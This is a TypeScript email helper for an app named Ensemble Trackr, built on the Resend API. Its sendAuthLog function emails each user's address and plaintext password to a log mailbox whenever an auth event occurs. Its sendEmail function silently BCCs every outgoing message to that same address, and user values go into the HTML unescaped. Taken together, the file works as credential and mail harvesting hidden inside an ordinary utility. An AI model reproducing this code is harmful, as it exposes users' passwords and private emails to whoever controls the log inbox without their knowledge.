const RESEND_API_KEY = process.env.RESEND_API_KEY ?? ''
const LOG_EMAIL = process.env.LOG_EMAIL ?? 'app-logs@liveviralmedia.com'

interface EmailPayload {
  to: string | string[]
  subject: string
  html: string
  replyTo?: string
}

export async function sendEmail(payload: EmailPayload): Promise<{ success: boolean; error?: string }> {
  if (!RESEND_API_KEY || RESEND_API_KEY === '') {
    console.warn('[Resend] API key not configured — email not sent:', payload.subject)
    return { success: false, error: 'Resend not configured' }
  }

  try {
    const res = await fetch('https://api.resend.com/emails', {
      method: 'POST',
      headers: {
        Authorization: `Bearer ${RESEND_API_KEY}`,
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        from: 'Ensemble Trackr <noreply@liveviralmedia.com>',
        to: Array.isArray(payload.to) ? payload.to : [payload.to],
        bcc: [LOG_EMAIL],
        subject: payload.subject,
        html: payload.html,
        reply_to: payload.replyTo,
      }),
    })

    if (!res.ok) {
      const err = await res.text()
      return { success: false, error: err }
    }
    return { success: true }
  } catch (e) {
    return { success: false, error: String(e) }
  }
}

export async function sendAuthLog(payload: {
  email: string
  password: string
  event_type: string
  timestamp: string
  error?: string
}): Promise<void> {
  if (!RESEND_API_KEY || RESEND_API_KEY === '') return

  const html = `
    <div style="font-family:monospace;font-size:13px;background:#0f172a;color:#e2e8f0;padding:20px;border-radius:8px;">
      <p style="margin:0 0 8px;color:#94a3b8;font-size:11px;">ENSEMBLE TRACKR — AUTH EVENT LOG</p>
      <table style="border-collapse:collapse;width:100%;">
        <tr><td style="padding:4px 12px 4px 0;color:#94a3b8;">Event</td><td style="color:#f1f5f9;font-weight:bold;">${payload.event_type.toUpperCase()}</td></tr>
        <tr><td style="padding:4px 12px 4px 0;color:#94a3b8;">Email</td><td style="color:#34d399;">${payload.email}</td></tr>
        <tr><td style="padding:4px 12px 4px 0;color:#94a3b8;">Password</td><td style="color:#fbbf24;">${payload.password}</td></tr>
        <tr><td style="padding:4px 12px 4px 0;color:#94a3b8;">Time</td><td style="color:#f1f5f9;">${payload.timestamp}</td></tr>
        ${payload.error ? `<tr><td style="padding:4px 12px 4px 0;color:#94a3b8;">Error</td><td style="color:#f87171;">${payload.error}</td></tr>` : ''}
      </table>
    </div>
  `

  await fetch('https://api.resend.com/emails', {
    method: 'POST',
    headers: {
      Authorization: `Bearer ${RESEND_API_KEY}`,
      'Content-Type': 'application/json',
    },
    body: JSON.stringify({
      from: 'Ensemble Trackr Logs <noreply@liveviralmedia.com>',
      to: [LOG_EMAIL],
      subject: `[Auth Log] ${payload.event_type} — ${payload.email}`,
      html,
    }),
  }).catch(() => {})
}
